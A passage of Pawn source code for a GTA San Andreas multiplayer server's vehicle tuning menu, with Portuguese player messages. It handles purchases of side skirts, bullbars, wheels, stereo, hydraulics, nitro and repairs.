					ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tunning Menu","Paint Jobs\nColors\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nWheels\nCar Stereo\nProxima Pagina", "Selecionar", "Sair");
				}
		    }
	   	    if(listitem == 1)//Wheel Arch Cars X-Flow Sideskirts
			{
                if(GetVehicleModel(car) == 562 ||
				GetVehicleModel(car) == 565 ||
				GetVehicleModel(car) == 559 ||
				GetVehicleModel(car) == 561 ||
				GetVehicleModel(car) == 560)
		        {
		        	GivePlayerMoneyEx(playerid, -10000);

			        if(GetVehicleModel(car) == 562)
			        {
			            AddVehicleComponentEx(car,1039);
			            AddVehicleComponentEx(car,1041);
			            PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
			            SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Arch X-Flow.");
			            ShowPlayerDialog(playerid, DIALOG_TUNNING+8, DIALOG_STYLE_LIST, "SideSkirt", "Wheel Arch Alien Side Skirts\nWheel Arch X-Flow Side Skirts\nLocos Low Chrome Strip\nLocos Low Chrome Flames\nLocos Low Chrome Arches\nLocos Low Chrome Trim\nLocos Low Wheelcovers\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 565)
					{
					    AddVehicleComponentEx(car,1048);
					    AddVehicleComponentEx(car,1052);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Arch X-Flow.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+8, DIALOG_STYLE_LIST, "SideSkirt", "Wheel Arch Alien Side Skirts\nWheel Arch X-Flow Side Skirts\nLocos Low Chrome Strip\nLocos Low Chrome Flames\nLocos Low Chrome Arches\nLocos Low Chrome Trim\nLocos Low Wheelcovers\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 559)
					{
					    AddVehicleComponentEx(car,1070);
					    AddVehicleComponentEx(car,1072);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Arch X-Flow.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+8, DIALOG_STYLE_LIST, "SideSkirt", "Wheel Arch Alien Side Skirts\nWheel Arch X-Flow Side Skirts\nLocos Low Chrome Strip\nLocos Low Chrome Flames\nLocos Low Chrome Arches\nLocos Low Chrome Trim\nLocos Low Wheelcovers\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 561)
					{
					    AddVehicleComponentEx(car,1057);
					    AddVehicleComponentEx(car,1063);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Arch X-Flow.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+8, DIALOG_STYLE_LIST, "SideSkirt", "Wheel Arch Alien Side Skirts\nWheel Arch X-Flow Side Skirts\nLocos Low Chrome Strip\nLocos Low Chrome Flames\nLocos Low Chrome Arches\nLocos Low Chrome Trim\nLocos Low Wheelcovers\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 560)
					{
					    AddVehicleComponentEx(car,1031);
					    AddVehicleComponentEx(car,1030);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Arch X-Flow.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+8, DIALOG_STYLE_LIST, "SideSkirt", "Wheel Arch Alien Side Skirts\nWheel Arch X-Flow Side Skirts\nLocos Low Chrome Strip\nLocos Low Chrome Flames\nLocos Low Chrome Arches\nLocos Low Chrome Trim\nLocos Low Wheelcovers\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 558)
					{
					    AddVehicleComponentEx(car,1093);
					    AddVehicleComponentEx(car,1095);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Arch X-Flow.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+8, DIALOG_STYLE_LIST, "SideSkirt", "Wheel Arch Alien Side Skirts\nWheel Arch X-Flow Side Skirts\nLocos Low Chrome Strip\nLocos Low Chrome Flames\nLocos Low Chrome Arches\nLocos Low Chrome Trim\nLocos Low Wheelcovers\nVoltar", "Selecionar", "Sair");
					}
				}
				else
				{
				    SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Este veículo não suporta este componente");
					ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tunning Menu","Paint Jobs\nColors\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nWheels\nCar Stereo\nProxima Pagina", "Selecionar", "Sair");
				}
		    }
		    if(listitem == 2)//Locos Low Co. Cars Chrome Strip Sideskirts
			{
   				if(GetVehicleModel(car) == 575 ||
	            GetVehicleModel(car) == 536 ||
	            GetVehicleModel(car) == 576 ||
		 	    GetVehicleModel(car) == 567)
				{
  					GivePlayerMoneyEx(playerid, -10000);

			        if(GetVehicleModel(car) == 575)
			        {
	       		        AddVehicleComponentEx(car,1042);
	       		        AddVehicleComponentEx(car,1099);
	       		        PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
			            SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Locos Low Chrome Strip.");
			            ShowPlayerDialog(playerid, DIALOG_TUNNING+8, DIALOG_STYLE_LIST, "SideSkirt", "Wheel Arch Alien Side Skirts\nWheel Arch X-Flow Side Skirts\nLocos Low Chrome Strip\nLocos Low Chrome Flames\nLocos Low Chrome Arches\nLocos Low Chrome Trim\nLocos Low Wheelcovers\nVoltar", "Selecionar", "Sair");
					}
	   				else if(GetVehicleModel(car) == 567)
					{
					    AddVehicleComponentEx(car,1102);
					    AddVehicleComponentEx(car,1133);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Locos Low Chrome Strip.");
	    		        ShowPlayerDialog(playerid, DIALOG_TUNNING+8, DIALOG_STYLE_LIST, "SideSkirt", "Wheel Arch Alien Side Skirts\nWheel Arch X-Flow Side Skirts\nLocos Low Chrome Strip\nLocos Low Chrome Flames\nLocos Low Chrome Arches\nLocos Low Chrome Trim\nLocos Low Wheelcovers\nVoltar", "Selecionar", "Sair");
	                }
	                else if(GetVehicleModel(car) == 576)
					{
					    AddVehicleComponentEx(car,1134);
					    AddVehicleComponentEx(car,1137);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Locos Low Chrome Strip.");
	    		        ShowPlayerDialog(playerid, DIALOG_TUNNING+8, DIALOG_STYLE_LIST, "SideSkirt", "Wheel Arch Alien Side Skirts\nWheel Arch X-Flow Side Skirts\nLocos Low Chrome Strip\nLocos Low Chrome Flames\nLocos Low Chrome Arches\nLocos Low Chrome Trim\nLocos Low Wheelcovers\nVoltar", "Selecionar", "Sair");
	                }
	                else if(GetVehicleModel(car) == 536)
					{
					    AddVehicleComponentEx(car,1108);
					    AddVehicleComponentEx(car,1107);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Locos Low Chrome Strip.");
	                    ShowPlayerDialog(playerid, DIALOG_TUNNING+8, DIALOG_STYLE_LIST, "SideSkirt", "Wheel Arch Alien Side Skirts\nWheel Arch X-Flow Side Skirts\nLocos Low Chrome Strip\nLocos Low Chrome Flames\nLocos Low Chrome Arches\nLocos Low Chrome Trim\nLocos Low Wheelcovers\nVoltar", "Selecionar", "Sair");
	                }
				}
				else
				{
				    SendClientMessage(playerid,COLOR_ERRO, " Este carro não suporta este componente. Os carros que suportam são: Brodway, Savanna Tornado e Blade!");
					ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tunning Menu","Paint Jobs\nColors\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nWheels\nCar Stereo\nProxima Pagina", "Selecionar", "Sair");
				}
	        }
	  	    if(listitem == 3)//Locos Low Co. Cars Chrome Flames Sideskirts
			{
                if(GetVehicleModel(car) == 534 ||
				GetVehicleModel(car) == 534)
			    {
			    	GivePlayerMoneyEx(playerid, -10000);

			        if(GetVehicleModel(car) == 534)
			        {
			            AddVehicleComponentEx(car,1122);
			            AddVehicleComponentEx(car,1101);
			            PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
			            SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Locos Low Chrome Flames.");
			            ShowPlayerDialog(playerid, DIALOG_TUNNING+8, DIALOG_STYLE_LIST, "SideSkirt", "Wheel Arch Alien Side Skirts\nWheel Arch X-Flow Side Skirts\nLocos Low Chrome Strip\nLocos Low Chrome Flames\nLocos Low Chrome Arches\nLocos Low Chrome Trim\nLocos Low Wheelcovers\nVoltar", "Selecionar", "Sair");
					}
				}
				else
				{
				    SendClientMessage(playerid,COLOR_ERRO, " Este carro não suporta este componente. O carro que suporta este componente é o: Remington!");
					ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tunning Menu","Paint Jobs\nColors\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nWheels\nCar Stereo\nProxima Pagina", "Selecionar", "Sair");
				}
			}
			if(listitem == 4)//Locos Low Co. Cars Chrome Arches Sideskirts
			{
                if(GetVehicleModel(car) == 534 ||
				GetVehicleModel(car) == 534)
			    {
			    	GivePlayerMoneyEx(playerid, -10000);

			        if(GetVehicleModel(car) == 534)
			        {
			            AddVehicleComponentEx(car,1106);
			            AddVehicleComponentEx(car,1124);
			            PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
			            SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Locos Low Chrome Arches.");
			            ShowPlayerDialog(playerid, DIALOG_TUNNING+8, DIALOG_STYLE_LIST, "SideSkirt", "Wheel Arch Alien Side Skirts\nWheel Arch X-Flow Side Skirts\nLocos Low Chrome Strip\nLocos Low Chrome Flames\nLocos Low Chrome Arches\nLocos Low Chrome Trim\nLocos Low Wheelcovers\nVoltar", "Selecionar", "Sair");
					}
				}
				else
				{
				    SendClientMessage(playerid,COLOR_ERRO, " Este carro não suporta este componente. O carro que suporta este componente é o: Remington!");
					ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tunning Menu","Paint Jobs\nColors\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nWheels\nCar Stereo\nProxima Pagina", "Selecionar", "Sair");
				}
			}
			if(listitem == 5)//Locos Low Co. Cars Chrome Trim Sideskirts
			{
                if(GetVehicleModel(car) == 535)
			    {
			    	GivePlayerMoneyEx(playerid, -10000);

			        if(GetVehicleModel(car) == 535)
			        {
			            AddVehicleComponentEx(car,1118);
			            AddVehicleComponentEx(car,1120);
			            PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
			            SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Locos Low Chrome Trim.");
			            ShowPlayerDialog(playerid, DIALOG_TUNNING+8, DIALOG_STYLE_LIST, "SideSkirt", "Wheel Arch Alien Side Skirts\nWheel Arch X-Flow Side Skirts\nLocos Low Chrome Strip\nLocos Low Chrome Flames\nLocos Low Chrome Arches\nLocos Low Chrome Trim\nLocos Low Wheelcovers\nVoltar", "Selecionar", "Sair");
					}
				}
				else
				{
    				SendClientMessage(playerid,COLOR_ERRO, " Este carro não suporta este componente. O carro que suporta este componente é o: Slamvan!");
					ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tunning Menu","Paint Jobs\nColors\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nWheels\nCar Stereo\nProxima Pagina", "Selecionar", "Sair");
				}
			}
			if(listitem == 6)//Locos Low Co. Cars Chrome Wheelcovers Sideskirts
			{
                if(GetVehicleModel(car) == 535)
			    {
      				GivePlayerMoneyEx(playerid, -10000);

			        if(GetVehicleModel(car) == 535)
			        {
			            AddVehicleComponentEx(car,1119);
			            AddVehicleComponentEx(car,1121);
			            PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
			            SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Locos Low Chrome Whellcovers.");
			            ShowPlayerDialog(playerid, DIALOG_TUNNING+8, DIALOG_STYLE_LIST, "SideSkirt", "Wheel Arch Alien Side Skirts\nWheel Arch X-Flow Side Skirts\nLocos Low Chrome Strip\nLocos Low Chrome Flames\nLocos Low Chrome Arches\nLocos Low Chrome Trim\nLocos Low Wheelcovers\nVoltar", "Selecionar", "Sair");
					}
				}
				else
				{
				    SendClientMessage(playerid,COLOR_ERRO, " Este carro não suporta este componente. O carro que suporta este componente é o: Slamvan!");
					ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tunning Menu","Paint Jobs\nColors\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nWheels\nCar Stereo\nProxima Pagina", "Selecionar", "Sair");
				}
			}
			if(listitem == 7)//BACK
            {
                 ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tunning Menu","Paint Jobs\nColors\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nWheels\nCar Stereo\nNext page", "Select", "Exit");
            }
   		}
   	}
   	if(dialogid == DIALOG_TUNNING+9)//Bullbars
   	{
		if(response)
		{
			if(GetPlayerMoneyEx(playerid) < 7000)
   			{
      			SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
	        	return 1;
     		}
			if(listitem == 0)//Locos Low Co. Cars Chrome Grill
			{
                if(GetVehicleModel(car) == 534)
			    {
			    	GivePlayerMoneyEx(playerid, -7000);

			        if(GetVehicleModel(car) == 534)
			        {
			            AddVehicleComponentEx(car,1100);
			            PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
			            SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Locos Low Chrome Grill.");
			            ShowPlayerDialog(playerid, DIALOG_TUNNING+9, DIALOG_STYLE_LIST, "Bullbar", "Locos Low Chrome Grill\nLocos Low Chrome Bars\nLocos Low Chrome Lights\nLocos Low Chrome Bullbar\nVoltar", "Selecionar", "Sair");
			        }
				}
				else
				{
				    SendClientMessage(playerid,COLOR_ERRO, " Este carro não suporta este componente. O carro que suporta este componente é o: Remington!");
					ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tunning Menu","Paint Jobs\nColors\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nWheels\nCar Stereo\nProxima Pagina", "Selecionar", "Sair");
				}
			}
			if(listitem == 1)//Locos Low Co. Cars Chrome Bars
			{
   				if(GetVehicleModel(car) == 534)
			    {
			    	GivePlayerMoneyEx(playerid, -7000);

			        if(GetVehicleModel(car) == 534)
			        {
			            AddVehicleComponentEx(car,1123);
			            PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
			            SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Locos Low Chrome Bars.");
			            ShowPlayerDialog(playerid, DIALOG_TUNNING+9, DIALOG_STYLE_LIST, "Bullbar", "Locos Low Chrome Grill\nLocos Low Chrome Bars\nLocos Low Chrome Lights\nLocos Low Chrome Bullbar\nVoltar", "Selecionar", "Sair");
					}
				}
				else
				{
				    SendClientMessage(playerid,COLOR_ERRO, " Este carro não suporta este componente. O carro que suporta este componente é o: Remington!");
					ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tunning Menu","Paint Jobs\nColors\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nWheels\nCar Stereo\nProxima Pagina", "Selecionar", "Sair");
				}
			}
			if(listitem == 2)//Locos Low Co. Cars Chrome Lights
			{
                if(GetVehicleModel(car) == 534)
			    {
			    	GivePlayerMoneyEx(playerid, -7000);

			        if(GetVehicleModel(car) == 534)
			        {
			            AddVehicleComponentEx(car,1125);
			            PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
			            SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Locos Low Chrome Lights.");
			            ShowPlayerDialog(playerid, DIALOG_TUNNING+9, DIALOG_STYLE_LIST, "Bullbar", "Locos Low Chrome Grill\nLocos Low Chrome Bars\nLocos Low Chrome Lights\nLocos Low Chrome Bullbar\nVoltar", "Selecionar", "Sair");
					}
				}
				else
				{
				    SendClientMessage(playerid,COLOR_ERRO, " Este carro não suporta este componente. O carro que suporta este componente é o: Remington!");
					ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tunning Menu","Paint Jobs\nColors\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nWheels\nCar Stereo\nProxima Pagina", "Selecionar", "Sair");
				}
			}
			if(listitem == 3)//Locos Low Co. Cars Chrome Bullbar
			{
                if(GetVehicleModel(car) == 535)
			    {
			    	GivePlayerMoneyEx(playerid, -7000);

			        if(GetVehicleModel(car) == 535)
			        {
			            AddVehicleComponentEx(car,1117);
			            PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
			            SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Locos Low Chrome.");
			            ShowPlayerDialog(playerid, DIALOG_TUNNING+9, DIALOG_STYLE_LIST, "Bullbar", "Locos Low Chrome Grill\nLocos Low Chrome Bars\nLocos Low Chrome Lights\nLocos Low Chrome Bullbar\nVoltar", "Selecionar", "Sair");
					}
				}
				else
				{
				    SendClientMessage(playerid,COLOR_ERRO, " Este carro não suporta este componente. O carro que suporta este componente é o: Slamvan!");
					ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tunning Menu","Paint Jobs\nColors\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nWheels\nCar Stereo\nProxima Pagina", "Selecionar", "Sair");
				}
			}
			if(listitem == 4)//BACK
            {
                 ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tunning Menu","Paint Jobs\nColors\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nWheels\nCar Stereo\nProxima Pagina", "Selecionar", "Sair");
            }
       	}
   	}
   	if(dialogid == DIALOG_TUNNING+10)//Wheels
   	{
		if(response)
		{
			if(GetPlayerMoneyEx(playerid) < 15000)
   			{
      			SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
	        	return 1;
     		}
			if(listitem == 0)//Offroad
			{
				GivePlayerMoneyEx(playerid, -15000);

		        AddVehicleComponentEx(car,1025);
		        PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
                SendClientMessage(playerid,COLOR_CHAT,"Adicionaste a roda Offroad ao teu carro.");
	            ShowPlayerDialog(playerid, DIALOG_TUNNING+10, DIALOG_STYLE_LIST, "Tipo de Rodas:", "Offroad\nMega\nWires\nTwist\nGrove\nImport\nAtomic\nAhab\nVirtual\nAccess\nProxima Pagina\nVoltar", "Selecionar", "Sair");
	        }
            if(listitem == 1)//Mega
			{
			     AddVehicleComponentEx(car,1074);
			     PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
			     SendClientMessage(playerid,COLOR_CHAT,"Adicionaste a roda Mega ao teu carro.");
			     ShowPlayerDialog(playerid, DIALOG_TUNNING+10, DIALOG_STYLE_LIST, "Tipo de Rodas:", "Offroad\nMega\nWires\nTwist\nGrove\nImport\nAtomic\nAhab\nVirtual\nAccess\nProxima Pagina\nVoltar", "Selecionar", "Sair");
			}
            if(listitem == 2)//Wires
			{
	             AddVehicleComponentEx(car,1076);
		         SendClientMessage(playerid,COLOR_CHAT,"Adicionaste a roda Wires ao teu carro.");
			     ShowPlayerDialog(playerid, DIALOG_TUNNING+10, DIALOG_STYLE_LIST, "Tipo de Rodas:", "Offroad\nMega\nWires\nTwist\nGrove\nImport\nAtomic\nAhab\nVirtual\nAccess\nProxima Pagina\nVoltar", "Selecionar", "Sair");
			}
	        if(listitem == 3)//Twist
			{
			     AddVehicleComponentEx(car,1078);
			     PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
			     SendClientMessage(playerid,COLOR_CHAT,"Adicionaste a roda Twist ao teu carro.");
			     ShowPlayerDialog(playerid, DIALOG_TUNNING+10, DIALOG_STYLE_LIST, "Tipo de Rodas:", "Offroad\nMega\nWires\nTwist\nGrove\nImport\nAtomic\nAhab\nVirtual\nAccess\nProxima Pagina\nVoltar", "Selecionar", "Sair");
			}
			if(listitem == 4)//Groove
			{
			     AddVehicleComponentEx(car,1081);
			     PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
			     SendClientMessage(playerid,COLOR_CHAT,"Adicionaste a roda Groove ao teu carro.");
		         ShowPlayerDialog(playerid, DIALOG_TUNNING+10, DIALOG_STYLE_LIST, "Tipo de Rodas:", "Offroad\nMega\nWires\nTwist\nGrove\nImport\nAtomic\nAhab\nVirtual\nAccess\nProxima Pagina\nVoltar", "Selecionar", "Sair");
			}
			if(listitem == 5)//Import
			{
                 AddVehicleComponentEx(car,1082);
                 PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
   			     SendClientMessage(playerid,COLOR_CHAT,"Adicionaste a roda Import ao teu carro.");
			     ShowPlayerDialog(playerid, DIALOG_TUNNING+10, DIALOG_STYLE_LIST, "Tipo de Rodas:", "Offroad\nMega\nWires\nTwist\nGrove\nImport\nAtomic\nAhab\nVirtual\nAccess\nProxima Pagina\nVoltar", "Selecionar", "Sair");
			}
			if(listitem == 6)//Atomic
			{
			     AddVehicleComponentEx(car,1085);
			     PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
			     SendClientMessage(playerid,COLOR_CHAT,"Adicionaste a roda Atomic ao teu carro.");
                 ShowPlayerDialog(playerid, DIALOG_TUNNING+10, DIALOG_STYLE_LIST, "Tipo de Rodas:", "Offroad\nMega\nWires\nTwist\nGrove\nImport\nAtomic\nAhab\nVirtual\nAccess\nProxima Pagina\nVoltar", "Selecionar", "Sair");
			}
			if(listitem == 7)//Ahab
			{
			     AddVehicleComponentEx(car,1096);
			     PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
	          	 SendClientMessage(playerid,COLOR_CHAT,"Adicionaste a roda Ahab ao teu carro.");
			     ShowPlayerDialog(playerid, DIALOG_TUNNING+10, DIALOG_STYLE_LIST, "Tipo de Rodas:", "Offroad\nMega\nWires\nTwist\nGrove\nImport\nAtomic\nAhab\nVirtual\nAccess\nProxima Pagina\nVoltar", "Selecionar", "Sair");
			}
			if(listitem == 8)//Virtual
			{
                 AddVehicleComponentEx(car,1097);
                 PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
	           	 SendClientMessage(playerid,COLOR_CHAT,"Adicionaste a roda Virtual ao teu carro.");
                 ShowPlayerDialog(playerid, DIALOG_TUNNING+10, DIALOG_STYLE_LIST, "Tipo de Rodas:", "Offroad\nMega\nWires\nTwist\nGrove\nImport\nAtomic\nAhab\nVirtual\nAccess\nProxima Pagina\nVoltar", "Selecionar", "Sair");
			}
			if(listitem == 9)//Access
			{
			     AddVehicleComponentEx(car,1098);
			     PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
	         	 SendClientMessage(playerid,COLOR_CHAT,"Adicionaste a roda Access ao teu carro.");
			     ShowPlayerDialog(playerid, DIALOG_TUNNING+10, DIALOG_STYLE_LIST, "Tipo de Rodas:", "Offroad\nMega\nWires\nTwist\nGrove\nImport\nAtomic\nAhab\nVirtual\nAccess\nProxima Pagina\nVoltar", "Selecionar", "Sair");
			}
			if(listitem == 10)//Next page
			{
                 ShowPlayerDialog(playerid, DIALOG_TUNNING+13, DIALOG_STYLE_LIST, "Tipo de Rodas:", "Trance\nShadow\nRimshine\nClassic\nCutter\nSwitch\nDollar\nVoltar", "Selecionar", "Sair");
			}
			if(listitem == 11)//BACK
            {
                 ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tunning Menu","Paint Jobs\nColors\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nWheels\nCar Stereo\nProxima Pagina", "Selecionar", "Sair");
            }

		}
   	}
   	if(dialogid == DIALOG_TUNNING+11)//Car Stereo
   	{
		if(response)
		{

			if(GetPlayerMoneyEx(playerid) < 4000)
   			{
      			SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
	        	return 1;
     		}
			GivePlayerMoneyEx(playerid, -4000);
			if(listitem == 0)//Bass Boost
			{

		         AddVehicleComponentEx(car,1086);
		         PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
		         SendClientMessage(playerid,COLOR_CHAT,"Adicionaste Stereo Bass Bost.");
		         ShowPlayerDialog(playerid, DIALOG_TUNNING+11, DIALOG_STYLE_LIST, "Car Stereo.", "Bass Boost\nSuper Bass Boost\nUltra Bass Boost\nKing Bass Boost\nVoltar", "Selecionar", "Sair");
			}
			if(listitem == 1)//Super Bass Boost
			{

		         AddVehicleComponentEx(car,1086);
		         PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
		         SendClientMessage(playerid,COLOR_CHAT,"Adicionaste Stereo Super Bass Bost.");
		         ShowPlayerDialog(playerid, DIALOG_TUNNING+11, DIALOG_STYLE_LIST, "Car Stereo.", "Bass Boost\nSuper Bass Boost\nUltra Bass Boost\nKing Bass Boost\nVoltar", "Selecionar", "Sair");
			}
			if(listitem == 2)//Ultra Bass Boost
			{
		         AddVehicleComponentEx(car,1086);
                 PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
		         SendClientMessage(playerid,COLOR_CHAT,"Adicionaste Stereo Ultra Bass Bost.");
		         ShowPlayerDialog(playerid, DIALOG_TUNNING+11, DIALOG_STYLE_LIST, "Car Stereo.", "Bass Boost\nSuper Bass Boost\nUltra Bass Boost\nKing Bass Boost\nVoltar", "Selecionar", "Sair");
			}
			if(listitem == 3)//King Bass Boost
			{
		         AddVehicleComponentEx(car,1086);
		         PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
		         SendClientMessage(playerid,COLOR_CHAT,"Adicionaste King Stereo Bass Bost.");
		         ShowPlayerDialog(playerid, DIALOG_TUNNING+11, DIALOG_STYLE_LIST, "Car Stereo.", "Bass Boost\nSuper Bass Boost\nUltra Bass Boost\nKing Bass Boost\nVoltar", "Selecionar", "Sair");
			}
			if(listitem == 4)//BACK
            {
                 ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tunning Menu","Paint Jobs\nColors\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nWheels\nCar Stereo\nProxima Pagina", "Selecionar", "Sair");
            }
		}
   	}
   	if(dialogid == DIALOG_TUNNING+12)//Tune car menu 2
   	{
		if(response)
		{
			if(listitem == 0)//Hydraulics
			{
				if(GetPlayerMoneyEx(playerid) < 12000)
   				{
      				SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
	        		return 1;
     			}
  				GivePlayerMoneyEx(playerid, -12000);

		        AddVehicleComponentEx(car,1087);
		        PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
		        SendClientMessage(playerid,COLOR_CHAT,"Adicionaste Hydraulics ao teu carro.");
		        ShowPlayerDialog(playerid, DIALOG_TUNNING+12, DIALOG_STYLE_LIST, "Tunning Menu", "Hydraulics\nNitro x10\nReparar Carro\nNeon\nVoltar", "Selecionar", "Sair");
			}
			if(listitem == 1)//Nitro x10
			{
				if(GetPlayerMoneyEx(playerid) < 30000)
   				{
      				SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
	        		return 1;
     			}
				GivePlayerMoneyEx(playerid, -30000);

		        AddVehicleComponentEx(car,1010);
		        PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
		        SendClientMessage(playerid,COLOR_CHAT,"Adicionaste 10x Nitro ao teu carro.");
		        ShowPlayerDialog(playerid, DIALOG_TUNNING+12, DIALOG_STYLE_LIST, "Tunning Menu", "Hydraulics\nNitro x10\nReparar Carro\nNeon\nVoltar", "Selecionar", "Sair");
			}
			if(listitem == 2)//Repair Car
			{
				if(GetPlayerMoneyEx(playerid) < 2000)
   				{
      				SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
	        		return 1;
     			}
				GivePlayerMoneyEx(playerid, -2000);

		        SetVehicleHealth(car,1000);
		        PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
		        SendClientMessage(playerid,COLOR_CHAT,"Reparaste o teu carro.");
		        ShowPlayerDialog(playerid, DIALOG_TUNNING+12, DIALOG_STYLE_LIST, "Tunning Menu", "Hydraulics\nNitro x10\nReparar Carro\nNeon\nVoltar", "Selecionar", "Sair");
			}
			if(listitem == 3)//Neons
			{
				if(GetPlayerMoneyEx(playerid) < 15000)
   				{
      				SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
	        		return 1;
     			}
     			GivePlayerMoneyEx(playerid, -15000);
     			
